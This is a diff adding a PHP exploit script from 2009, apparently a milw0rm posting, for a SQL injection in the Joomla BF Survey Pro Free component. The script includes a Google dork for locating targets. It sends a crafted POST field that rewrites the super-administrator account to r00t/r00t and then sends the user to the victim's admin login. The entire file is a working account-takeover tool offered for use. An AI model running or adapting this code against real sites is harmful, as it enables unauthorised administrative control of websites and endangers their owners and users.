@@ -1,0 +1,42 @@
+<?php
+ echo '<h2>Joomla Component BF Survey Pro Free SQL Injection Exploit</h2>';
+ echo '<h4>jdc 2009</h4>';
+ echo '<p>Google dork: inurl:com_bfsurvey_profree</p>';
+   ini_set( "memory_limit", "128M" );
+   ini_set( "max_execution_time", 0 );
+   set_time_limit( 0 );
+   if( !isset( $_GET['url'] ) ) die( 'Usage: '.$_SERVER['SCRIPT_NAME'].'?url=www.victim.com' );
+   $vulnerableFile = "http://".$_GET['url']."/index.php";
+   $url = $vulnerableFile;
+ $data = array();
+ $data['option'] = 'com_bfsurvey_profree';
+ $data['task'] = 'updateOnePage';
+ $data['table'] = "jos_users set username=CHAR(".sqlChar( 'r00t' )."), password=CHAR(".sqlChar( md5('r00t' ) )."), email=CHAR(".sqlChar( 'x' ).") where gid=25 limit 1   --   '";
+ $output = getData();
+ die( '<script>alert("Now log in as r00t/r00t!");location.href="http://'.$_GET['url'].'/administrator/index.php";</script>' );
+ function shutUp( $buffer ) { return false; }
+ function sqlChar( $str ) { return implode( ',', array_map( 'ord', str_split( $str ) ) ); }
+ function getData()
+ {
+   global $data, $url;
+   ob_start( "shutUp" );
+   $ch = curl_init();
+   curl_setopt( $ch, CURL_TIMEOUT, 120 );
+   curl_setopt( $ch, CURL_RETURNTRANSFER, 0 );
+   curl_setopt( $ch, CURLOPT_URL, $url );
+   if( count( $data ) > 0 )
+   {
+           curl_setopt( $ch, CURLOPT_POST, count( $data ) );
+           curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $data ) );
+   }
+   curl_setopt( $ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)" );
+   curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
+   $result = curl_exec( $ch );
+   curl_close( $ch );
+   $return = ob_get_contents();
+   ob_end_clean();
+   return $return;
+ }
+?>
+
+# milw0rm.com [2009-09-09]
